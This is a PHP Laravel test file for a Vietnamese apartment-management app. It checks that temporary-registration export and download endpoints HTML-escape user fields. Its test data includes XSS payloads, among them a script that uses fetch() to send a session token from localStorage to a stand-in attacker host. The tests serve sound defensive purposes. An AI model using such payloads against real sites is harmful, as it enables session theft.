<?php

namespace Tests\Feature\TemporaryRegistrations;

use App\Models\Apartment;
use App\Models\Resident;
use App\Models\Role;
use App\Models\TemporaryRegistration;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Tests\TestCase;

class TemporaryRegistrationXssTest extends TestCase
{
    /**
     * Tạo tài khoản quản trị viên kèm phiên đăng nhập Bearer token
     */
    protected function createAdminUser(): array
    {
        $user = User::create([
            'username' => 'adm_xss_'.Str::random(8),
            'phone_number' => '09'.rand(10000000, 99999999),
            'email' => 'adm_xss_'.Str::random(8).'@cassavas.vn',
            'password_hash' => Hash::make('password123'),
            'full_name' => 'Admin Security XSS Tester',
            'status' => 'ACTIVE',
        ]);

        $role = Role::where('role_code', 'SUPER_ADMIN')->first();
        if ($role) {
            DB::table('user_roles')->insert([
                'id' => (string) Str::uuid(),
                'user_id' => $user->id,
                'role_id' => $role->id,
                'is_primary' => 1,
                'assigned_at' => now(),
            ]);
        }

        $token = 'smart_token_'.$user->id.'_'.Str::random(40);
        $tokenHash = hash('sha256', $token);

        DB::table('user_sessions')->insert([
            'id' => (string) Str::uuid(),
            'user_id' => $user->id,
            'refresh_token_hash' => $tokenHash,
            'device_name' => 'PHPUnit XSS Test Agent',
            'ip_address' => '127.0.0.1',
            'user_agent' => 'PHPUnit',
            'expires_at' => now()->addDays(1),
            'is_revoked' => 0,
            'created_at' => now(),
        ]);

        return [$user, $token];
    }

    /**
     * Tạo căn hộ test với mã ngẫu nhiên đảm bảo tính duy nhất
     */
    protected function createApartment(string $code = 'XSS'): Apartment
    {
        $block = DB::table('blocks')->first();
        $floor = DB::table('floors')->first();

        return Apartment::create([
            'id' => (string) Str::uuid(),
            'block_id' => $block->id ?? (string) Str::uuid(),
            'floor_id' => $floor->id ?? (string) Str::uuid(),
            'apartment_number' => $code.'-'.Str::upper(Str::random(6)),
            'room_type' => '2_BEDROOM',
            'gross_floor_area_sqm' => 75.0,
            'net_usable_area_sqm' => 68.0,
            'status' => 'OCCUPIED',
        ]);
    }

    /**
     * Tạo cư dân test cho căn hộ
     */
    protected function createResident(Apartment $apt, string $name = 'Nguyen Van XSS', array $extraUserFields = [], array $extraResidentFields = []): Resident
    {
        $user = User::create(array_merge([
            'username' => 'u_xss_'.Str::random(8),
            'phone_number' => '09'.rand(10000000, 99999999),
            'email' => 'u_xss_'.Str::random(8).'@cassavas.vn',
            'password_hash' => Hash::make('password123'),
            'full_name' => $name,
            'national_id_number' => '079'.rand(100000000, 999999999),
            'status' => 'ACTIVE',
        ], $extraUserFields));

        return Resident::create(array_merge([
            'user_id' => $user->id,
            'apartment_id' => $apt->id,
            'resident_type' => 'TENANT',
            'is_head_of_household' => false,
            'stay_start_date' => '2026-01-01',
            'relationship_to_head' => 'TENANT',
            'is_active' => true,
        ], $extraResidentFields));
    }

    /**
     * Test 1: Biểu mẫu CT01 escape toàn bộ payload XSS trong reason và notes
     */
    public function test_01_ct01_export_escapes_xss_payload_in_reason_and_notes(): void
    {
        [, $token] = $this->createAdminUser();
        $apt = $this->createApartment('XSS1');
        $resident = $this->createResident($apt, 'Pham Thi Attacker');

        $xssReason = '<script>fetch("https://evil.attacker.com/?cookie="+localStorage.getItem("smartcassavas_session"))</script>';
        $xssNotes = '<img src=x onerror="alert(\'XSS_NOTES\')">';

        $reg = TemporaryRegistration::create([
            'apartment_id' => $apt->id,
            'resident_id' => $resident->id,
            'registration_type' => 'TEMPORARY_STAY',
            'start_date' => '2026-11-01',
            'end_date' => '2026-12-31',
            'reason' => $xssReason,
            'notes' => $xssNotes,
            'police_status' => 'PENDING',
        ]);

        $res = $this->withHeader('Authorization', "Bearer {$token}")
            ->getJson("/api/v1/residents/temporary-registrations/{$reg->id}/export");

        $res->assertStatus(200);

        $htmlContent = $res->json('data.html_content');
        $this->assertNotEmpty($htmlContent);

        // Đảm bảo không chứa thẻ script thô hay thẻ img có onerror thô
        $this->assertStringNotContainsString('<script>', $htmlContent);
        $this->assertStringNotContainsString('</script>', $htmlContent);
        $this->assertStringNotContainsString('<img src=x onerror=', $htmlContent);

        // Đảm bảo đã được mã hóa HTML entities an toàn
        $this->assertStringContainsString('&lt;script&gt;fetch(&quot;https://evil.attacker.com/?cookie=&quot;+localStorage.getItem(&quot;smartcassavas_session&quot;))&lt;/script&gt;', $htmlContent);
        $this->assertStringContainsString('&lt;img src=x onerror=&quot;alert(&#039;XSS_NOTES&#039;)&quot;&gt;', $htmlContent);
    }

    /**
     * Test 2: Biểu mẫu CT01 escape ký tự nguy hiểm trong thông tin cư dân và căn hộ
     */
    public function test_02_ct01_export_escapes_xss_in_user_profile_and_resident_fields(): void
    {
        [, $token] = $this->createAdminUser();
        $apt = $this->createApartment('XSS2');

        $maliciousName = '<b onmouseover=alert("XSS_NAME")>Le Van Hack</b>';
        $maliciousOccupation = 'Engineer <svg/onload=alert("XSS_JOB")>';

        $resident = $this->createResident($apt, $maliciousName, [], [
            'occupation' => $maliciousOccupation,
        ]);

        $reg = TemporaryRegistration::create([
            'apartment_id' => $apt->id,
            'resident_id' => $resident->id,
            'registration_type' => 'TEMPORARY_STAY',
            'start_date' => '2026-11-01',
            'end_date' => '2026-12-31',
            'reason' => 'Đăng ký bình thường kiểm tra PII escaping',
            'police_status' => 'APPROVED',
            'police_reference_code' => 'POLICE-REF-<script>123</script>',
        ]);

        $res = $this->withHeader('Authorization', "Bearer {$token}")
            ->getJson("/api/v1/residents/temporary-registrations/{$reg->id}/export");

        $res->assertStatus(200);

        $htmlContent = $res->json('data.html_content');

        // Không chứa raw HTML tags nguy hiểm
        $this->assertStringNotContainsString('<b onmouseover=', $htmlContent);
        $this->assertStringNotContainsString('<svg/onload=', $htmlContent);
        $this->assertStringNotContainsString('<script>123</script>', $htmlContent);

        // Chứa HTML entities an toàn
        $this->assertStringContainsString('&lt;b onmouseover=alert(&quot;XSS_NAME&quot;)&gt;Le Van Hack&lt;/b&gt;', $htmlContent);
        $this->assertStringContainsString('Engineer &lt;svg/onload=alert(&quot;XSS_JOB&quot;)&gt;', $htmlContent);
        $this->assertStringContainsString('POLICE-REF-&lt;script&gt;123&lt;/script&gt;', $htmlContent);
    }

    /**
     * Test 3: Endpoint Download trả về file HTML có escape an toàn
     */
    public function test_03_ct01_download_endpoint_returns_escaped_html(): void
    {
        [, $token] = $this->createAdminUser();
        $apt = $this->createApartment('XSS3');
        $resident = $this->createResident($apt, 'Nguyen Van Download');

        $reg = TemporaryRegistration::create([
            'apartment_id' => $apt->id,
            'resident_id' => $resident->id,
            'registration_type' => 'TEMPORARY_ABSENCE',
            'start_date' => '2026-11-15',
            'end_date' => '2026-11-20',
            'reason' => '<iframe src="javascript:alert(1)"></iframe>',
            'police_status' => 'PENDING',
        ]);

        $res = $this->withHeader('Authorization', "Bearer {$token}")
            ->get("/api/v1/residents/temporary-registrations/{$reg->id}/download");

        $res->assertStatus(200);
        $this->assertStringContainsString('text/html', $res->headers->get('Content-Type'));

        $content = $res->getContent();
        $this->assertStringNotContainsString('<iframe src="javascript:alert(1)"></iframe>', $content);
        $this->assertStringContainsString('&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;', $content);
    }

    /**
     * Test 4: Không làm biến dạng ký tự tiếng Việt có dấu
     */
    public function test_04_ct01_export_preserves_vietnamese_unicode_characters(): void
    {
        [, $token] = $this->createAdminUser();
        $apt = $this->createApartment('XSS4');
        $resident = $this->createResident($apt, 'Nguyễn Vũ Hoàng Long & Trần Thị Mỹ Duyên');

        $reg = TemporaryRegistration::create([
            'apartment_id' => $apt->id,
            'resident_id' => $resident->id,
            'registration_type' => 'TEMPORARY_STAY',
            'start_date' => '2026-11-01',
            'end_date' => '2026-12-31',
            'reason' => 'Về quê ăn Tết & thăm gia đình tại Đà Nẵng, Quảng Nam',
            'notes' => 'Đã nộp giấy tờ đầy đủ tại quầy ban quản lý',
            'police_status' => 'PENDING',
        ]);

        $res = $this->withHeader('Authorization', "Bearer {$token}")
            ->getJson("/api/v1/residents/temporary-registrations/{$reg->id}/export");

        $res->assertStatus(200);

        $htmlContent = $res->json('data.html_content');

        // Ký tự tiếng Việt được bảo toàn nguyên vẹn
        $this->assertStringContainsString('Nguyễn Vũ Hoàng Long &amp; Trần Thị Mỹ Duyên', $htmlContent);
        $this->assertStringContainsString('Về quê ăn Tết &amp; thăm gia đình tại Đà Nẵng, Quảng Nam', $htmlContent);
        $this->assertStringContainsString('Đã nộp giấy tờ đầy đủ tại quầy ban quản lý', $htmlContent);
        $this->assertStringContainsString('CỘNG HÒA XÃ HỘI CHỦ NGHĨA VIỆT NAM', $htmlContent);
        $this->assertStringContainsString('Độc lập - Tự do - Hạnh phúc', $htmlContent);
    }

    /**
     * Test 5: Xử lý an toàn khi các trường tùy chọn bị null
     */
    public function test_05_ct01_export_handles_null_optional_fields_safely(): void
    {
        [, $token] = $this->createAdminUser();
        $apt = $this->createApartment('XSS5');
        $resident = $this->createResident($apt, 'Nguyen Van Minimal');

        $reg = TemporaryRegistration::create([
            'apartment_id' => $apt->id,
            'resident_id' => $resident->id,
            'registration_type' => 'TEMPORARY_STAY',
            'start_date' => '2026-11-01',
            'end_date' => '2026-12-31',
            'reason' => 'Khai báo tạm trú tối giản',
            'notes' => null,
            'police_status' => 'PENDING',
            'police_reference_code' => null,
            'reviewed_by' => null,
            'reviewed_at' => null,
        ]);

        $res = $this->withHeader('Authorization', "Bearer {$token}")
            ->getJson("/api/v1/residents/temporary-registrations/{$reg->id}/export");

        $res->assertStatus(200);
        $htmlContent = $res->json('data.html_content');

        $this->assertStringContainsString('Chưa cấp', $htmlContent);
        $this->assertStringContainsString('Đang chờ xử lý', $htmlContent);
        $this->assertStringContainsString('Ban Quản Lý Tòa Nhà', $htmlContent);
    }
}
